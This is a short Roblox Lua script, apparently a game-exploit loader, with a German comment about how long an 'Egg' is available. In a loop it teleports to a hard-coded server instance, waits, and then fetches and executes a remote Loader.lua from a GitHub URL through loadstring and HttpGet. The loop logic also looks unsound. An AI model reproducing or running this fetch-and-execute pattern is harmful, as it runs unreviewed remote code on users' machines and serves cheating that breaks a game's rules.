-- Zeit in Sekunden, wie lange das Egg verfügbar ist
local EggTimeLeft = 600

while true do
    game:GetService("TeleportService"):TeleportToPlaceInstance(85896571713843, "fc89e8b5-751a-430b-9434-462a56b4eaed")
    wait(EggTimeLeft)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PxnifyDev/roblox-job-ids/main/data/Loader.lua"))()
end
